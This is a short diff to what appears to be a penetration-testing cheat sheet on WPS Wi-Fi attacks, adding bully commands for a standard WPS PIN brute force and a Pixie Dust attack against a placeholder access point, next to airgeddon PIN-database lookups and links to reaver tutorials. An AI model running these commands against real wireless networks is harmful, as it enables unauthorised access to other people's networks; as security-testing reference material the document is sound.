@@ -61,6 +61,16 @@ echo /usr/share/airgeddon/known_pins.db ${PINDB["0013F7"]}
 grep "0013F7" /usr/share/airgeddon/known_pins.db
 ```
 
+#### Bully - reaver alternative
+
+Standard use
+```text
+sudo bully -b AA:BB:CC:XX:YY:ZZ -c 1 -vv wlan0mon
+```
+Pixie Dust
+```text
+sudo bully -b AA:BB:CC:XX:YY:ZZ -c 1 -d -vv wlan0mon
+```
 https://kalitut.com/wifi-attack-with-wps-using-reaver/
 
 https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/
